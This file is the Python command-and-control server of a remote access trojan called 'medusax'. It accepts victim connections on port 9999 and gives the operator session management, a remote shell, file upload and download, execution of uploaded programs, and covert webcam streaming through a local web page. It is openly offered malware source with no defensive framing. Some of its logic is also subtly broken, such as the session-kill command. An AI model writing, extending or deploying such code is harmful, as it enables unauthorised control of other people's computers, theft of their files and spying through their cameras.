import socket
import threading
import os
import subprocess
from time import sleep
from flask import Flask, Response

clients = {}  # session_id: (conn, addr)
sessions_counter = 0
current_session = None
flask_thread = None
flask_app = Flask(__name__)
webcam_streaming = False

def recv_data(conn):
    try:
        return conn.recv(4096).decode()
    except:
        return "[!] Error receiving data"

def send_data(conn, data):
    try:
        conn.send(data.encode())
    except:
        pass

def webcam_feed_gen(conn):
    while webcam_streaming:
        try:
            data = conn.recv(20480)
            if not data:
                break
            yield (b"--frame\r\nContent-Type: image/jpeg\r\n\r\n" + data + b"\r\n")
        except:
            break

@flask_app.route("/webcam")
def webcam_feed():
    if current_session:
        conn, _ = clients[current_session]
        return Response(webcam_feed_gen(conn), mimetype="multipart/x-mixed-replace; boundary=frame")
    return "[!] No active webcam session."

def start_flask():
    flask_app.run(host="0.0.0.0", port=5000)

def handle_client(conn, addr, session_id):
    global sessions_counter
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
        except:
            break
    conn.close()
    del clients[session_id]

def accept_connections(server_socket):
    global sessions_counter
    while True:
        conn, addr = server_socket.accept()
        sessions_counter += 1
        clients[sessions_counter] = (conn, addr)
        print(f"[+] New client #{sessions_counter} from {addr[0]}:{addr[1]}")
        threading.Thread(target=handle_client, args=(conn, addr, sessions_counter), daemon=True).start()

def server_prompt():
    global current_session, webcam_streaming, flask_thread

    while True:
        cmd = input("admin@medusax~$ ").strip()
        if cmd == "sessions":
            for sid, (conn, addr) in clients.items():
                print(f"Session {sid} - {addr[0]}:{addr[1]}")
        elif cmd.startswith("sessions -i"):
            try:
                sid = int(cmd.split()[2])
                if sid in clients:
                    current_session = sid
                    print(f"[i] Interacting with session {sid}")
                else:
                    print("[!] Invalid session ID")
            except:
                print("[!] Usage: sessions -i <id>")
        elif cmd == "background":
            current_session = None
        elif cmd == "sessions -k":
            try:
                sid = int(cmd.split()[2])
                if sid in clients:
                    clients[sid][0].close()
                    del clients[sid]
                    print(f"[i] Session {sid} killed.")
                else:
                    print("[!] Invalid session ID")
            except:
                print("[!] Usage: sessions -k <id>")
        elif cmd == "sessions -K":
            for sid in list(clients.keys()):
                clients[sid][0].close()
                del clients[sid]
            print("[i] All sessions killed.")
        elif current_session:
            conn, addr = clients[current_session]

            # shell -d <path>
            if cmd.startswith("shell"):
                path = "C:\\"
                if "-d" in cmd:
                    parts = cmd.split()
                    if "-d" in parts:
                        i = parts.index("-d")
                        if i + 1 < len(parts):
                            path = parts[i + 1]
                send_data(conn, f"shell {path}")
                while True:
                    shell_cmd = input(f"{path}> ")
                    if shell_cmd.lower() == "exit":
                        send_data(conn, "exit_shell")
                        break
                    send_data(conn, f"sh:{shell_cmd}")
                    print(recv_data(conn))

            # pwd
            elif cmd == "pwd":
                send_data(conn, "pwd")
                print(recv_data(conn))

            # pl
            elif cmd == "pl":
                send_data(conn, "pl")
                print(recv_data(conn))

            # upload <file> -d <dest>
            elif cmd.startswith("upload"):
                try:
                    parts = cmd.split()
                    fname = parts[1]
                    dest = parts[3]
                    send_data(conn, f"upload {fname} {dest}")
                    with open(fname, "rb") as f:
                        data = f.read()
                        conn.sendall(data)
                    sleep(1)
                    conn.send(b"DONE")
                    print("[+] File uploaded.")
                except Exception as e:
                    print(f"[!] Error: {e}")

            # download <clientpath> -rd <localdest>
            elif cmd.startswith("download"):
                try:
                    parts = cmd.split()
                    cpath = parts[1]
                    lpath = parts[3]
                    send_data(conn, f"download {cpath}")
                    with open(lpath, "wb") as f:
                        while True:
                            data = conn.recv(4096)
                            if data.endswith(b"DONE"):
                                f.write(data[:-4])
                                break
                            f.write(data)
                    print("[+] File downloaded.")
                except Exception as e:
                    print(f"[!] Error: {e}")

            # run <file.exe>
            elif cmd.startswith("run"):
                fname = cmd.split()[1]
                send_data(conn, f"run {fname}")
                print(recv_data(conn))

            # webcam_stream -i <index>
            elif cmd.startswith("webcam_stream"):
                index = "0"
                parts = cmd.split()
                if "-i" in parts:
                    index = parts[parts.index("-i") + 1]
                send_data(conn, f"webcam {index}")
                print("[i] Starting webcam stream...")
                webcam_streaming = True
                if not flask_thread:
                    flask_thread = threading.Thread(target=start_flask, daemon=True)
                    flask_thread.start()
                print("[i] Visit http://localhost:5000/webcam")

            elif cmd == "CTRL+Z":
                send_data(conn, "stop_webcam")
                webcam_streaming = False
                print("[i] Webcam stream stopped.")

            else:
                send_data(conn, cmd)
                print(recv_data(conn))
        else:
            print("[!] No session selected. Use `sessions -i <id>`")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("[*] Server started on port 9999")
    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
    server_prompt()

if __name__ == "__main__":
    start_server()
